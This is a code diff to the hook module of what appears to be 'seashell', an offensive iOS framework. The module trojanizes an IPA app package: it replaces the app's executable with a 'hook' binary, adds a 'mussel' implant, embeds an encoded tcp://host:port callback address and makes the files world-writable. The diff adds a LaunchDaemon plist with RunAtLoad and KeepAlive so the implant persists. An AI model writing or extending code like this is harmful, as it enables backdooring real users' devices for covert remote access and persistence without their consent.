@@ -26,15 +26,14 @@ import os
 import shutil
 import plistlib
 
-from typing import Optional
-
 from alive_progress import alive_bar
+from typing import Optional
 from pex.string import String
 
 from seashell.lib.config import Config
 
 
-class Hook(Config):
+class Hook(object):
     """ Subclass of seashell.core module.
 
     This subclass of seashell.core module is intended for providing
@@ -50,14 +49,16 @@ class Hook(Config):
         :return None: None
         """
 
+        self.config = Config()
+
         if host and port:
             self.hash = String().base64_string(
                 f'tcp://{host}:{str(port)}', decode=True)
         else:
             self.hash = ''
 
-        self.main = self.data_path + 'hook'
-        self.mussel = self.data_path + 'Mussel.app/mussel'
+        self.main = self.config.data_path + 'hook'
+        self.mussel = self.config.data_path + 'Mussel.app/mussel'
 
     def patch_ipa(self, path: str) -> None:
         """ Patch existing IPA.
@@ -83,8 +84,11 @@ class Hook(Config):
             shutil.copy(self.main, bundle + executable)
             shutil.copy(self.mussel, bundle + 'mussel')
 
-            os.chmod(bundle + executable, 777)
-            os.chmod(bundle + 'mussel', 777)
+            # Add launch daemon configuration
+            self.add_launch_daemon(bundle)
+
+            os.chmod(bundle + executable, 0o777)
+            os.chmod(bundle + 'mussel', 0o777)
 
             app = path[:-4]
             os.remove(path)
@@ -129,3 +133,25 @@ class Hook(Config):
 
         with open(path, 'wb') as f:
             plistlib.dump(plist_data, f)
+
+    def add_launch_daemon(self, bundle: str) -> None:
+        """ Add a LaunchDaemon to run Mussel.
+
+        :param str bundle: path to app bundle
+        :return None: None
+        """
+        daemon_path = os.path.join(bundle, 'mussel.daemon.plist')
+
+        daemon_config = {
+            'Label': 'com.mussel.daemon',
+            'ProgramArguments': [
+                os.path.join(bundle, 'mussel')
+            ],
+            'RunAtLoad': True,
+            'KeepAlive': True,
+        }
+
+        with open(daemon_path, 'wb') as f:
+            plistlib.dump(daemon_config, f)
+
+        os.chmod(daemon_path, 0o644)
